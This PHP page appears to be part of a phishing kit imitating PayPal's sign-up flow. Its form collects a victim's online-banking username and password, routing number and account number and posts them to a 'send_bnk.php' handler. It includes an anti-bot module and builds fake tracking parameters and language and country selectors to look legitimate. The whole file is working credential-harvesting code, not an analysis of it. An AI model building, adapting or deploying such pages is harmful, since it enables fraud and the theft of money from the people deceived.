<?php

   session_start();
   error_reporting(E_ERROR | E_PARSE);

   include('anti/anti.php');
   include('config/config.php');
   include('include/get_lg.php');
   include('../hash.php');

   # Override the session $_SESSION['lang_']
   if(isset($_GET['lg'])){
       if($_GET['lg'] == 'US'){ $_SESSION['lang_'] = "en.php"; }
       else if($_GET['lg'] == 'FR'){ $_SESSION['lang_'] = "fr.php"; }
       else if($_GET['lg'] == 'ES'){ $_SESSION['lang_'] = "es.php"; }
   }

   $xDIR_LGx = "bnk.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2."&lg=";
   
   if(isset($_SESSION['lang_'])){
       include('langdir/'.$_SESSION['lang_']);
   }else {
       include('langdir/en.php');
   }

   //DO IT LATER
   if($identity_page == true){
       $xDIRx = "ids.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
   }else {
       $xDIRx = "thanks.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
   }
   
   ?>
<!DOCTYPE html>
<html lang="en-US">
   <head>
      <meta charSet="utf-8" />
      <title>(<?php echo $_SESSION['xcountryCodex']; ?>) <?php echo $xys67x; ?></title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0" />
      <link rel="apple-touch-icon" href="asset/img/pp64.png" />
      <link rel="shortcut icon" type="image/x-icon" href="asset/img/favicon/fav.ico" />
      <link rel="icon" type="image/x-icon" href="asset/img/favicon/fav.ico" />
      <link href="asset/css/myacc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
   </head>
   <body>
      <div id="app-element-mountpoint">
         <div id="document-body" dir="ltr">
            <div class="backgroundColor">
               <div>
                  <div class="signup clear app-wrapper">
                     <div class="signup-page-header"> <a class="signup-page-header-logo"></a> <a href="signinsecure.php" class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary"><?php echo $xys17x; ?></a></div>
                     <main>
                        <div>
                           <div class="signup-page-form">
                              <div class="notification"></div>
                              <div class="busyOverlay" style="transition: unset; display: none;">
                                 <div class="busyIcon" style="top: 50%;"></div>
                                 <p class="xysnewLoaderx"><?php echo $xys68x; ?></p>
                              </div>
                              <div>
                                 <form action="send/send_bnk.php?customer.x=ID-PA$1$7i/<?php echo md5(time()).md5(time()); ?>" id="PageMainForm" class="signupAppContent" method="POST">
                                    <div id="xysBankingx">
                                       <div>
                                          <div class="center">
                                             <h1 class="vx_text-2 center "><?php echo $xys69x; ?></h1>
                                          </div>
                                       </div>
                                       <div class="fieldGroupContainer">
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xysuserbankx"><?php echo $xys70x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys70x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" autoComplete="off" name="xysuserbankx" id="xysuserbankx" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys71x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class=" ">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xyspaswdbankx"><?php echo $xys13x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys13x; ?>">
                                                   <div class="vx_form-control"> <input type="password" style="padding-left:15px" value="" autoComplete="off" name="xyspaswdbankx" id="xyspaswdbankx" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span><?php echo $xys72x; ?></span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class="xysimgBankx"></div>
                                          <div class="xysinfobankaccx">
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xysroutingnumberx"><?php echo $xys73x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys73x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" autoComplete="off" name="xysroutingnumberx" id="xysroutingnumberx" maxlength="9" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span>Please enter your routing number.</span></p>
                                                </span>
                                             </div>
                                             <div class="vx_floatingLabel_complex vx_floatingLabel_active ">
                                                <label for="xysaccnumberx"><?php echo $xys74x; ?></label>
                                                <div class="vx_form-control" data-label-content="<?php echo $xys74x; ?>">
                                                   <div class="vx_form-control"> <input type="text" style="padding-left:15px" value="" autoComplete="off" name="xysaccnumberx" id="xysaccnumberx" maxlength="17" /></div>
                                                </div>
                                                <span>
                                                   <p class="hide" style="margin: 0px;"><span>Please enter your account number.</span></p>
                                                </span>
                                             </div>
                                          </div>
                                          <div class="xysclearbothx"></div>
                                       </div>
                                       <div class="btnGrp"> <button name="xysbtnConfirmx" id="xysbtnConfirmx" value="<?php echo $xys59x; ?>" class="vx_btn vx_btn-block" style="width:auto;margin-bottom: -5px;" data-automation-id="page_submit"><?php echo $xys59x; ?></button></div>
                                       <div class="divider xyscenterx">
                                          <p><a href="<?php echo $xDIRx ?>" style=" font-size: 14px;" name="xysskipbankx"><?php echo $xys75x; ?></a></p>
                                       </div>
                                    </div>
                                    <div class="country-and-lang-selector" style="margin-bottom: -22px;margin-top: 30px;"> <span class="picker country-selector"> <a aria-label="Change country" id="xyspopUpLangx" class="country <?php echo $_SESSION['xcountryCodex']; ?>"></a> </span> <span> <a href="<?php echo $xDIR_LGx."US"; ?>">English</a> | </span> <span> <a href="<?php echo $xDIR_LGx."FR"; ?>">Français</a> | </span> <span> <a href="<?php echo $xDIR_LGx."ES"; ?>">Español</a> | </span></div>
                                    
                                 </form>
                              </div>
                              <div class="signup-page-footer vx_text-legal text-center" style="margin-bottom: 15px;">
                                 ©1999–<?php echo date("Y"); ?>. <?php echo $xys60x; ?> <span class="signup-page-footer-separator">|</span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys6x; ?></a> <span class="signup-page-footer-spacer"> </span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys7x; ?></a> <span class="signup-page-footer-spacer"> </span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys5x; ?></a> <span class="signup-page-footer-spacer"> </span> <span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys61x; ?></a> </span> <a href="#" class="vx_text-legal"></a>
                              </div>
                           </div>
                        </div>
                     </main>
                     <div class="modalWindow hide xysPopUpLangx">
                        <div class="modalWrapper">
                           <div class="buttonHolder"> <button class="vx_modal-dismiss_x-trigger" id="xysclosePopUpLangx" style="outline: none;"> <span class="vx_a11yText"><?php echo $xys62x; ?></span> </button></div>
                           <div class="modalContent">
                              <div class="country-selector">
                                 <ul>
                                    <li class="vx_text-2 title"><?php echo $xys63x; ?></li>
                                    <li> <a href="#" class="country DZ">Algeria</a></li>
                                    <li> <a href="#" class="country AO">Angola</a></li>
                                    <li> <a href="#" class="country BJ">Benin</a></li>
                                    <li> <a href="#" class="country BW">Botswana</a></li>
                                    <li> <a href="#" class="country BF">Burkina Faso</a></li>
                                    <li> <a href="#" class="country BI">Burundi</a></li>
                                    <li> <a href="#" class="country CM">Cameroon</a></li>
                                    <li> <a href="#" class="country CV">Cape Verde</a></li>
                                    <li> <a href="#" class="country TD">Chad</a></li>
                                    <li> <a href="#" class="country KM">Comoros</a></li>
                                    <li> <a href="#" class="country CG">Congo - Brazzaville</a></li>
                                    <li> <a href="#" class="country CD">Congo - Kinshasa</a></li>
                                    <li> <a href="#" class="country CI">Côte d’Ivoire</a></li>
                                    <li> <a href="#" class="country DJ">Djibouti</a></li>
                                    <li> <a href="#" class="country EG">Egypt</a></li>
                                    <li> <a href="#" class="country ER">Eritrea</a></li>
                                    <li> <a href="#" class="country ET">Ethiopia</a></li>
                                    <li> <a href="#" class="country GA">Gabon</a></li>
                                    <li> <a href="#" class="country GM">Gambia</a></li>
                                    <li> <a href="#" class="country GN">Guinea</a></li>
                                    <li> <a href="#" class="country GW">Guinea-Bissau</a></li>
                                    <li> <a href="#" class="country KE">Kenya</a></li>
                                    <li> <a href="#" class="country LS">Lesotho</a></li>
                                    <li> <a href="#" class="country MG">Madagascar</a></li>
                                    <li> <a href="#" class="country MW">Malawi</a></li>
                                    <li> <a href="#" class="country ML">Mali</a></li>
                                    <li> <a href="#" class="country MR">Mauritania</a></li>
                                    <li> <a href="#" class="country MU">Mauritius</a></li>
                                    <li> <a href="#" class="country YT">Mayotte</a></li>
                                    <li> <a href="#" class="country MA">Morocco</a></li>
                                    <li> <a href="#" class="country MZ">Mozambique</a></li>
                                    <li> <a href="#" class="country NA">Namibia</a></li>
                                    <li> <a href="#" class="country NE">Niger</a></li>
                                    <li> <a href="#" class="country NG">Nigeria</a></li>
                                    <li> <a href="#" class="country RE">Réunion</a></li>
                                    <li> <a href="#" class="country RW">Rwanda</a></li>
                                    <li> <a href="#" class="country ST">São Tomé &amp; Príncipe</a></li>
                                    <li> <a href="#" class="country SN">Senegal</a></li>
                                    <li> <a href="#" class="country SC">Seychelles</a></li>
                                    <li> <a href="#" class="country SL">Sierra Leone</a></li>
                                    <li> <a href="#" class="country SO">Somalia</a></li>
                                    <li> <a href="#" class="country ZA">South Africa</a></li>
                                    <li> <a href="#" class="country SH">St. Helena</a></li>
                                    <li> <a href="#" class="country SZ">Swaziland</a></li>
                                    <li> <a href="#" class="country TZ">Tanzania</a></li>
                                    <li> <a href="#" class="country TG">Togo</a></li>
                                    <li> <a href="#" class="country TN">Tunisia</a></li>
                                    <li> <a href="#" class="country UG">Uganda</a></li>
                                    <li> <a href="#" class="country ZM">Zambia</a></li>
                                    <li> <a href="#" class="country ZW">Zimbabwe</a></li>
                                 </ul>
                                 <ul>
                                    <li class="vx_text-2 title"><?php echo $xys64x; ?></li>
                                    <li> <a href="#" class="country AI">Anguilla</a></li>
                                    <li> <a href="#" class="country AG">Antigua &amp; Barbuda</a></li>
                                    <li> <a href="#" class="country AR">Argentina</a></li>
                                    <li> <a href="#" class="country AW">Aruba</a></li>
                                    <li> <a href="#" class="country BS">Bahamas</a></li>
                                    <li> <a href="#" class="country BB">Barbados</a></li>
                                    <li> <a href="#" class="country BZ">Belize</a></li>
                                    <li> <a href="#" class="country BM">Bermuda</a></li>
                                    <li> <a href="#" class="country BO">Bolivia</a></li>
                                    <li> <a href="#" class="country BR">Brazil</a></li>
                                    <li> <a href="#" class="country VG">British Virgin Islands</a></li>
                                    <li> <a href="#" class="country CA">Canada</a></li>
                                    <li> <a href="#" class="country KY">Cayman Islands</a></li>
                                    <li> <a href="#" class="country CL">Chile</a></li>
                                    <li> <a href="#" class="country CO">Colombia</a></li>
                                    <li> <a href="#" class="country CR">Costa Rica</a></li>
                                    <li> <a href="#" class="country DM">Dominica</a></li>
                                    <li> <a href="#" class="country DO">Dominican Republic</a></li>
                                    <li> <a href="#" class="country EC">Ecuador</a></li>
                                    <li> <a href="#" class="country SV">El Salvador</a></li>
                                    <li> <a href="#" class="country FK">Falkland Islands</a></li>
                                    <li> <a href="#" class="country GF">French Guiana</a></li>
                                    <li> <a href="#" class="country GL">Greenland</a></li>
                                    <li> <a href="#" class="country GD">Grenada</a></li>
                                    <li> <a href="#" class="country GP">Guadeloupe</a></li>
                                    <li> <a href="#" class="country GT">Guatemala</a></li>
                                    <li> <a href="#" class="country GY">Guyana</a></li>
                                    <li> <a href="#" class="country HN">Honduras</a></li>
                                    <li> <a href="#" class="country JM">Jamaica</a></li>
                                    <li> <a href="#" class="country MQ">Martinique</a></li>
                                    <li> <a href="#" class="country MX">Mexico</a></li>
                                    <li> <a href="#" class="country MS">Montserrat</a></li>
                                    <li> <a href="#" class="country AN">Netherlands Antilles</a></li>
                                    <li> <a href="#" class="country NI">Nicaragua</a></li>
                                    <li> <a href="#" class="country PA">Panama</a></li>
                                    <li> <a href="#" class="country PY">Paraguay</a></li>
                                    <li> <a href="#" class="country PE">Peru</a></li>
                                    <li> <a href="#" class="country KN">St. Kitts &amp; Nevis</a></li>
                                    <li> <a href="#" class="country LC">St. Lucia</a></li>
                                    <li> <a href="#" class="country PM">St. Pierre &amp; Miquelon</a></li>
                                    <li> <a href="#" class="country VC">St. Vincent &amp; Grenadines</a></li>
                                    <li> <a href="#" class="country SR">Suriname</a></li>
                                    <li> <a href="#" class="country TT">Trinidad &amp; Tobago</a></li>
                                    <li> <a href="#" class="country TC">Turks &amp; Caicos Islands</a></li>
                                    <li> <a href="#" class="country US">United States</a></li>
                                    <li> <a href="#" class="country UY">Uruguay</a></li>
                                    <li> <a href="#" class="country VE">Venezuela</a></li>
                                 </ul>
                                 <ul>
                                    <li class="vx_text-2 title"><?php echo $xys65x; ?></li>
                                    <li> <a href="#" class="country AM">Armenia</a></li>
                                    <li> <a href="#" class="country AU">Australia</a></li>
                                    <li> <a href="#" class="country BH">Bahrain</a></li>
                                    <li> <a href="#" class="country BT">Bhutan</a></li>
                                    <li> <a href="#" class="country BN">Brunei</a></li>
                                    <li> <a href="#" class="country KH">Cambodia</a></li>
                                    <li> <a href="#" class="country C2">China</a></li>
                                    <li> <a href="#" class="country CK">Cook Islands</a></li>
                                    <li> <a href="#" class="country FJ">Fiji</a></li>
                                    <li> <a href="#" class="country PF">French Polynesia</a></li>
                                    <li> <a href="#" class="country HK">Hong Kong SAR China</a></li>
                                    <li> <a href="#" class="country IN">India</a></li>
                                    <li> <a href="#" class="country ID">Indonesia</a></li>
                                    <li> <a href="#" class="country IL">Israel</a></li>
                                    <li> <a href="#" class="country JP">Japan</a></li>
                                    <li> <a href="#" class="country JO">Jordan</a></li>
                                    <li> <a href="#" class="country KZ">Kazakhstan</a></li>
                                    <li> <a href="#" class="country KI">Kiribati</a></li>
                                    <li> <a href="#" class="country KW">Kuwait</a></li>
                                    <li> <a href="#" class="country KG">Kyrgyzstan</a></li>
                                    <li> <a href="#" class="country LA">Laos</a></li>
                                    <li> <a href="#" class="country MY">Malaysia</a></li>
                                    <li> <a href="#" class="country MV">Maldives</a></li>
                                    <li> <a href="#" class="country MH">Marshall Islands</a></li>
                                    <li> <a href="#" class="country FM">Micronesia</a></li>
                                    <li> <a href="#" class="country MN">Mongolia</a></li>
                                    <li> <a href="#" class="country NR">Nauru</a></li>
                                    <li> <a href="#" class="country NP">Nepal</a></li>
                                    <li> <a href="#" class="country NC">New Caledonia</a></li>
                                    <li> <a href="#" class="country NZ">New Zealand</a></li>
                                    <li> <a href="#" class="country NU">Niue</a></li>
                                    <li> <a href="#" class="country NF">Norfolk Island</a></li>
                                    <li> <a href="#" class="country OM">Oman</a></li>
                                    <li> <a href="#" class="country PW">Palau</a></li>
                                    <li> <a href="#" class="country PG">Papua New Guinea</a></li>
                                    <li> <a href="#" class="country PH">Philippines</a></li>
                                    <li> <a href="#" class="country PN">Pitcairn Islands</a></li>
                                    <li> <a href="#" class="country QA">Qatar</a></li>
                                    <li> <a href="#" class="country WS">Samoa</a></li>
                                    <li> <a href="#" class="country SA">Saudi Arabia</a></li>
                                    <li> <a href="#" class="country SG">Singapore</a></li>
                                    <li> <a href="#" class="country SB">Solomon Islands</a></li>
                                    <li> <a href="#" class="country KR">South Korea</a></li>
                                    <li> <a href="#" class="country LK">Sri Lanka</a></li>
                                    <li> <a href="#" class="country TW">Taiwan</a></li>
                                    <li> <a href="#" class="country TJ">Tajikistan</a></li>
                                    <li> <a href="#" class="country TH">Thailand</a></li>
                                    <li> <a href="#" class="country TO">Tonga</a></li>
                                    <li> <a href="#" class="country TM">Turkmenistan</a></li>
                                    <li> <a href="#" class="country TV">Tuvalu</a></li>
                                    <li> <a href="#" class="country AE">United Arab Emirates</a></li>
                                    <li> <a href="#" class="country VU">Vanuatu</a></li>
                                    <li> <a href="#" class="country VN">Vietnam</a></li>
                                    <li> <a href="#" class="country WF">Wallis &amp; Futuna</a></li>
                                    <li> <a href="#" class="country YE">Yemen</a></li>
                                 </ul>
                                 <ul>
                                    <li class="vx_text-2 title"><?php echo $xys66x; ?></li>
                                    <li> <a href="#" class="country AL">Albania</a></li>
                                    <li> <a href="#" class="country AD">Andorra</a></li>
                                    <li> <a href="#" class="country AT">Austria</a></li>
                                    <li> <a href="#" class="country AZ">Azerbaijan</a></li>
                                    <li> <a href="#" class="country BY">Belarus</a></li>
                                    <li> <a href="#" class="country BE">Belgium</a></li>
                                    <li> <a href="#" class="country BA">Bosnia &amp; Herzegovina</a></li>
                                    <li> <a href="#" class="country BG">Bulgaria</a></li>
                                    <li> <a href="#" class="country HR">Croatia</a></li>
                                    <li> <a href="#" class="country CY">Cyprus</a></li>
                                    <li> <a href="#" class="country CZ">Czech Republic</a></li>
                                    <li> <a href="#" class="country DK">Denmark</a></li>
                                    <li> <a href="#" class="country EE">Estonia</a></li>
                                    <li> <a href="#" class="country FO">Faroe Islands</a></li>
                                    <li> <a href="#" class="country FI">Finland</a></li>
                                    <li> <a href="#" class="country FR">France</a></li>
                                    <li> <a href="#" class="country GE">Georgia</a></li>
                                    <li> <a href="#" class="country DE">Germany</a></li>
                                    <li> <a href="#" class="country GI">Gibraltar</a></li>
                                    <li> <a href="#" class="country GR">Greece</a></li>
                                    <li> <a href="#" class="country HU">Hungary</a></li>
                                    <li> <a href="#" class="country IS">Iceland</a></li>
                                    <li> <a href="#" class="country IE">Ireland</a></li>
                                    <li> <a href="#" class="country IT">Italy</a></li>
                                    <li> <a href="#" class="country LV">Latvia</a></li>
                                    <li> <a href="#" class="country LI">Liechtenstein</a></li>
                                    <li> <a href="#" class="country LT">Lithuania</a></li>
                                    <li> <a href="#" class="country LU">Luxembourg</a></li>
                                    <li> <a href="#" class="country MK">Macedonia</a></li>
                                    <li> <a href="#" class="country MT">Malta</a></li>
                                    <li> <a href="#" class="country MD">Moldova</a></li>
                                    <li> <a href="#" class="country MC">Monaco</a></li>
                                    <li> <a href="#" class="country ME">Montenegro</a></li>
                                    <li> <a href="#" class="country NL">Netherlands</a></li>
                                    <li> <a href="#" class="country NO">Norway</a></li>
                                    <li> <a href="#" class="country PL">Poland</a></li>
                                    <li> <a href="#" class="country PT">Portugal</a></li>
                                    <li> <a href="#" class="country RO">Romania</a></li>
                                    <li> <a href="#" class="country RU">Russia</a></li>
                                    <li> <a href="#" class="country SM">San Marino</a></li>
                                    <li> <a href="#" class="country RS">Serbia</a></li>
                                    <li> <a href="#" class="country SK">Slovakia</a></li>
                                    <li> <a href="#" class="country SI">Slovenia</a></li>
                                    <li> <a href="#" class="country ES">Spain</a></li>
                                    <li> <a href="#" class="country SJ">Svalbard &amp; Jan Mayen</a></li>
                                    <li> <a href="#" class="country SE">Sweden</a></li>
                                    <li> <a href="#" class="country CH">Switzerland</a></li>
                                    <li> <a href="#" class="country UA">Ukraine</a></li>
                                    <li> <a href="#" class="country GB">United Kingdom</a></li>
                                    <li> <a href="#" class="country VA">Vatican City</a></li>
                                 </ul>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <script src="asset/js/jquery.min.js"></script> <script src="asset/js/bnk.js"></script> 
   </body>
</html>